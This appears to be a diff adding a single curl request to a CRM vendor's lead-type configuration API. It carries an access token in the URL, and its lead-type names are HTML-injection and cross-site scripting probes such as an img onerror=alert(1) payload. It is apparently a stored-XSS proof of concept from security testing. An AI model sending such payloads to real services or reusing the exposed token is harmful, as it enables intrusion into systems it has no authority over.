@@ -1,0 +1,12 @@
+curl --location 'https://api.crm4b2c.com/v1/LeadDetailsView.svc/EnableLeadTypeConfiguration?token=8ca108ddd608b11f6cbde12b4a87f9ef207d09e18ff83eb8a7961fd1d5f01c3b&OrgCode=37248' \
+--header 'Content-Type: application/json' \
+--data '{
+    "LeadTypeNames": [
+        "\"/><h1>test1234</h1>",
+        "\"/><img src onerror=alert(1)",
+        "\"/><u>test1234</u>",
+        "onmouseover=alert(1)",
+    ],
+    "Operation": 0,
+    "MapLeadTypeData": false
+}'
